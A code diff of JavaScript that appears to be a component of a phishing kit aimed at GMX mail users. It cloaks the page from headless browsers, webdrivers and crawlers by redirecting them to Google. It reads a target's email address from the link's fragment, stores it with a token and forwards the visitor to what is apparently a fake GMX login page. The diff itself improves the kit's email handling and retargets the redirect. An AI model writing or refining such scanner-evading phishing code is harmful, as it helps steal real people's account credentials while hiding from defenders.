@@ -1,11 +1,11 @@
-// Detect bots or headless browsers
+// Bot detection
 if (
   window.outerWidth === 0 || 
   window.outerHeight === 0 ||
   navigator.webdriver ||
   /HeadlessChrome|PhantomJS|bot|spider|crawl|curl|wget/i.test(navigator.userAgent)
 ) {
-  window.location.href = "https://google.com"; // Kick bots
+  window.location.href = "https://google.com";
   throw new Error("Bot detected");
 }
 
@@ -22,23 +22,26 @@ function encodeData(data) {
     .replace(/=+$/, '');
 }
 
+function isValidEmail(email) {
+  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+}
+
 window.onload = function () {
   const hash = window.location.hash.substring(1);
-  if (hash && hash.includes("@")) {
-    const email = hash;
+  const decodedEmail = decodeURIComponent(hash);
+
+  if (isValidEmail(decodedEmail)) {
     const token = generateSecureToken();
 
-    sessionStorage.setItem("redirect_email", email);
+    sessionStorage.setItem("redirect_email", decodedEmail);
     sessionStorage.setItem("redirect_token", token);
 
     history.replaceState(null, "", window.location.pathname); // Clean URL
 
-    const encodedEmail = encodeData(email);
+    const encodedEmail = encodeData(decodedEmail);
 
-    // Auto-redirect
-    window.location.href = `1/mx_login2.html#${encodedEmail}&token=${token}`;
+    window.location.href = `gmx/mx_login2.html#${encodedEmail}&token=${token}`;
   } else {
-    // Fallback if no valid email
     window.location.href = "https://google.com";
   }
 };
